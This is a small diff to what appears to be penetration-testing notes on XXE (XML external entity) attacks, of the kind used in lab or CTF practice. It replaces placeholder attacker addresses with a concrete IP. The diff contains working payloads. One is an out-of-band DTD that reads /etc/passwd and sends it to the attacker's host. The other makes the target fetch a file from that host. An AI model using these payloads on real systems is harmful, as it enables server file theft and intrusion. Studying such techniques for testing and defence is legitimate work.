@@ -169,7 +169,7 @@ Wordlist to use in Burp Suite Intruder for fuzzing XXE: `/usr/share/seclists/Fuz
 1. Create file named xxe.dtd with content:
 ```xml
 <!ENTITY % content SYSTEM "file:///etc/passwd">
-<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://[kali-ip]/out?%content;'>" >
+<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://192.168.88.131/out?%content;'>" >
 ```
 2. Serve file with http 
 3. Insert file in payload 
@@ -206,7 +206,7 @@ Note that extracting file with multiple lines may not work due to encoding issue
 <?xml version="1.0"?>
 <!DOCTYPE data [
 <!ELEMENT data ANY >
-<!ENTITY lastname SYSTEM "http://<our ip address>/somefile">
+<!ENTITY lastname SYSTEM "http://192.168.88.131/somefile">
 ]>
 <Contact>
   <lastName>&lastname;</lastName>
